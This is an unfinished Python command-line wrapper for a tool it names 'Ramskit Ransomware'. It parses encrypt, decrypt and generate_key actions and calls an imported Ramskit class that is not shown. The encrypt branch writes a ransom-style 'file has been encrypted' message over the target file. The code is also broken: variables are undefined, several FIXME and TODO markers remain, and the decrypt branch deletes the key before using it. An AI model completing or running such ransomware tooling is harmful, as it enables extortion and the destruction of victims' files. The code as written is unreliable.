#!/usr/bin/python3

""" Copyright (C) 2023 Luis De León

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. """


from ramskit import Ramskit
import os
import sys
import argparse


# TODO 1: Implement Ramskit classls
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
    parser.add_argument('-a', '--action', dest="action", required=True,
                        help='Action to perform [encrypt/decrypt/generate_key]')
    # parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
    parser.add_argument('-f', '--file', dest="file", help='File(s) to encrypt/decrypt') # FIXME 3: Check this
    args = parser.parse_args()
    
    ramskit = Ramskit()
    key = ramskit.load_key()

    action = args.action.lower()
    file = args.file

    # FIXME 2: Encrypt/decrypt
    if action == 'encrypt':
        # It needs changes here
        with open(file, 'w') as f:
            f.write('''
                Heyo, this file has been encrypted!. \n\n
            ''')
        ramskit.encrypt_file(items, key)
    elif action == 'decrypt':
        # And here
        if not os.path.exists(lam):
            print('No look_at_me.txt file found. Exiting...')
            sys.exit(1)
        
        # FIXME 4: Check key   
        os.remove(key)
        items.remove(key)
        ramskit.decrypt_file(items, key)
    elif action == 'generate_key':
        print(Ramskit.generate_key())
    else:
        raise Exception('Invalid action: ', action)
        sys.exit(1)
